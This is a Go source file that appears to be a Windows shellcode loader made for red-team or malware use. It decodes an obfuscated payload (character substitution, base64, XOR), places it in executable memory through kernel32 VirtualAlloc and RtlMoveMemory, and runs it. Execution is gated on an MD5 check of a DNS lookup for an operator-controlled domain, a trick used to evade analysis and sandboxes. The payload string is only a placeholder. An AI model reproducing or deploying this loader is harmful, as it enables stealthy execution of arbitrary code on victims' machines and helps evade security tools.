package main

import (
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"syscall"
	"unsafe"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	// VirtualAlloc 申请虚拟内存
	VirtualAlloc = kernel32.NewProc("VirtualAlloc")

	// RtlMoveMemory 内存复制
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")

	xk = []byte{0x13, 0x54, 077, 0x1A, 0xA1, 0x3F, 0x04, 0x8B}
)

func calcMd5(text string) string {
	Md5Inst := md5.New()
	Md5Inst.Write([]byte(text))
	Result := Md5Inst.Sum([]byte(""))
	md5hash := fmt.Sprintf("%x", Result)
	return md5hash
}
func Dencode(src string) []byte {
	src = strings.Replace(src, ")", "d", -1)
	src = strings.Replace(src, "@", "w", -1)
	src = strings.Replace(src, "*", "k", -1)
	sc, _ := base64.StdEncoding.DecodeString(src)
	var sch []byte
	for i := 0; i < len(sc); i++ {
		sch = append(sch, sc[i]^xk[1]^xk[2])
	}
	return sch
}

func run(ppppppaaaaaaayyyyyyyyllllllooooooddddddd string) {
	sch := Dencode(ppppppaaaaaaayyyyyyyyllllllooooooddddddd)
	// fmt.Println(sch)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sch)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sch[0])), uintptr(len(sch)))
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
	domain := "sectest.dkkkkk.com"
	ip, _ := net.ResolveIPAddr("ip", domain)
	// 可通过监控 dns 查看是否被溯源反制、上线情况。

	if calcMd5(ip.String()) == "e086aa137fa19f67d27b39d0eca18610" {
		run("paylaod")
	}
}
